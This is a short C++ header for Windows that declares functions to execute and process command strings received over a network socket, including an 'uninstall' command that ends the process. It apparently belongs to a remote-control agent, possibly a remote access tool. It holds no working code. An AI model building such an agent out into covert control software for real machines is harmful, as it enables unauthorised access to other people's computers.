// Core/commands.h
#pragma once
#include <winsock2.h>
#include <string>

// Execute command and return result string.
// If command is 'uninstall', this function may not return (process exits).
std::string execute_builtin_command(const std::string& cmd, SOCKET sock);
void process_command(const std::string& cmd, SOCKET sock);